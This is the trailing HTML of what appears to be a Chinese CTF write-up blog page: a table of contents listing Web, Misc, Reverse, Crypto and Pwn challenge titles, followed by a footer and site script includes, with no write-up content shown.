href="#%E7%AE%80%E5%8D%95%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%85%B3%E6%B3%A8%EF%BC%9A%E2%80%9D%E6%9D%AD%E5%B8%88%E5%A4%A7%E7%BD%91%E5%AE%89%E2%80%9C%E8%B0%A2%E8%B0%A2%E5%96%B5%F0%9F%90%B1"><span class="nav-text">简单签到，关注：”杭师大网安“谢谢喵🐱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-zip"><span class="nav-text">ez_zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TeamGipsy-ctfer"><span class="nav-text">TeamGipsy&amp;ctfer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E5%8F%91%E7%8E%B0%E5%9B%BE%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E5%90%97%EF%BC%9F"><span class="nav-text">你能发现图中的秘密吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#next-is-the-end"><span class="nav-text">next is the end</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where-it-is-osint"><span class="nav-text">where it is(osint)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E7%9A%84%E8%BF%90%E6%B0%94%E6%98%AF%E5%A5%BD%E6%98%AF%E5%9D%8F%EF%BC%9F"><span class="nav-text">你的运气是好是坏？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E5%95%A5o-o"><span class="nav-text">这是啥o_o</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse%EF%BC%9A"><span class="nav-text">Reverse：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XTEA"><span class="nav-text">XTEA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#conforand"><span class="nav-text">conforand</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9B%87%E5%B9%B4%E7%9A%84%E6%9C%AC%E5%91%BD%E8%AF%AD%E8%A8%80"><span class="nav-text">蛇年的本命语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B0%B4%E6%9E%9C%E5%BF%8D%E8%80%85"><span class="nav-text">水果忍者</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#randomsystem"><span class="nav-text">randomsystem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exchange"><span class="nav-text">exchange</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto%EF%BC%9A"><span class="nav-text">Crypto：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%AE%9DRSA"><span class="nav-text">宝宝RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B4%B9%E5%85%8B%E7%89%B9%E5%B0%94"><span class="nav-text">费克特尔</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tRwSiAns"><span class="nav-text">tRwSiAns</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mm%E4%B8%8D%E8%BA%B2%E7%8C%AB%E7%8C%AB"><span class="nav-text">mm不躲猫猫</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAAAAAAA%C2%B7%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="nav-text">AAAAAAAA·真·签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%87%AA%F0%9F%87%BF%F0%9F%87%B7%F0%9F%87%B8%F0%9F%87%A6"><span class="nav-text">🇪🇿🇷🇸🇦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LLLCG"><span class="nav-text">LLLCG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn%EF%BC%9A"><span class="nav-text">Pwn：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmt"><span class="nav-text">fmt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack"><span class="nav-text">stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#heap"><span class="nav-text">heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#overflow"><span class="nav-text">overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#noret"><span class="nav-text">noret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#onlygets"><span class="nav-text">onlygets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qheap"><span class="nav-text">qheap</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2025
        
            &nbsp;</i>&nbsp;&nbsp;<a href="/">C3ngH</a>
        
    </div>

    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">总字数</span>
                    <span class="item-value border-box word">98k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">访客数</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">访问量</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%EF%BC%9A"><span class="nav-text">Web：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="nav-text">AAA偷渡阴平</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%81%AB%E7%9C%BC"><span class="nav-text">火眼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD"><span class="nav-text">直面天命</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GAME"><span class="nav-text">GAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GAME-plus"><span class="nav-text">GAME plus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GAME-Ultra"><span class="nav-text">GAME Ultra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezupload"><span class="nav-text">ezupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9F"><span class="nav-text">什么文件上传？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9%EF%BC%8C%E7%86%9F%E6%82%89%E7%9A%84%E5%91%B3%E9%81%93"><span class="nav-text">熟悉的配方，熟悉的味道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="nav-text">直面天命（复仇）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="nav-text">AAA偷渡阴平（复仇）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9F%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="nav-text">什么文件上传？（复仇）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc%EF%BC%9A"><span class="nav-text">Misc：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%85%B3%E6%B3%A8%EF%BC%9A%E2%80%9D%E6%9D%AD%E5%B8%88%E5%A4%A7%E7%BD%91%E5%AE%89%E2%80%9C%E8%B0%A2%E8%B0%A2%E5%96%B5%F0%9F%90%B1"><span class="nav-text">简单签到，关注：”杭师大网安“谢谢喵🐱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-zip"><span class="nav-text">ez_zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TeamGipsy-ctfer"><span class="nav-text">TeamGipsy&amp;ctfer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E5%8F%91%E7%8E%B0%E5%9B%BE%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E5%90%97%EF%BC%9F"><span class="nav-text">你能发现图中的秘密吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#next-is-the-end"><span class="nav-text">next is the end</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where-it-is-osint"><span class="nav-text">where it is(osint)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E7%9A%84%E8%BF%90%E6%B0%94%E6%98%AF%E5%A5%BD%E6%98%AF%E5%9D%8F%EF%BC%9F"><span class="nav-text">你的运气是好是坏？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E5%95%A5o-o"><span class="nav-text">这是啥o_o</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse%EF%BC%9A"><span class="nav-text">Reverse：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XTEA"><span class="nav-text">XTEA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#conforand"><span class="nav-text">conforand</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9B%87%E5%B9%B4%E7%9A%84%E6%9C%AC%E5%91%BD%E8%AF%AD%E8%A8%80"><span class="nav-text">蛇年的本命语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B0%B4%E6%9E%9C%E5%BF%8D%E8%80%85"><span class="nav-text">水果忍者</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#randomsystem"><span class="nav-text">randomsystem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exchange"><span class="nav-text">exchange</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto%EF%BC%9A"><span class="nav-text">Crypto：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%AE%9DRSA"><span class="nav-text">宝宝RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B4%B9%E5%85%8B%E7%89%B9%E5%B0%94"><span class="nav-text">费克特尔</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tRwSiAns"><span class="nav-text">tRwSiAns</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mm%E4%B8%8D%E8%BA%B2%E7%8C%AB%E7%8C%AB"><span class="nav-text">mm不躲猫猫</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAAAAAAA%C2%B7%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="nav-text">AAAAAAAA·真·签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%87%AA%F0%9F%87%BF%F0%9F%87%B7%F0%9F%87%B8%F0%9F%87%A6"><span class="nav-text">🇪🇿🇷🇸🇦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LLLCG"><span class="nav-text">LLLCG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn%EF%BC%9A"><span class="nav-text">Pwn：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmt"><span class="nav-text">fmt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack"><span class="nav-text">stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#heap"><span class="nav-text">heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#overflow"><span class="nav-text">overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#noret"><span class="nav-text">noret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#onlygets"><span class="nav-text">onlygets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qheap"><span class="nav-text">qheap</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->

    
<script src="/js/lazyload.js"></script>



<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
